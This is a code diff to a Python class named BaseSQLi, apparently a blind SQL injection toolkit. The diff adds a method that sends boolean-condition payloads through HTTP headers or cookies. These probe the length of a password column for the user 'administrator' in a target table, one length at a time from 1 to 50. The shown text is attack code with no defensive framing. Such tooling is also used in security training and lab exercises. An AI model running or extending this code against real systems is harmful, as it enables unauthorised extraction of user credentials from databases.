@@ -1,5 +1,6 @@
 import requests
 from .dbConfig import DB_CONFIG
+import time
 
 class BaseSQLi:
     def __init__(self, url, targetTable, db_type="oracle", inject_point=None, extra_cookies=None):
@@ -51,3 +52,22 @@ class BaseSQLi:
         param = self.inject_point["param"]
         headers = {param: payload}
         return self.session.get(self.url, headers=headers, cookies=self.extra_cookies)
+
+
+    def build_condition_payload(self, condition):
+        raise NotImplementedError("Subclasses should implement this method.")
+
+    def check_signal(self, response):
+        raise NotImplementedError("Subclasses should implement this method.")
+
+    def detect_length(self, column, username='administrator'):
+        print("[*] Detecting password length...")
+        for length in range(1, 51):
+            condition = f"LENGTH((SELECT {column} FROM {self.targetTable} WHERE username='{username}'))={length}"
+            payload = self.build_condition_payload(condition)
+            response = self.send(payload)
+            if self.check_signal(response):
+                print(f"[+] Password length: {length}")
+                return length
+        print("[-] Could not detect password length.")
+        return None
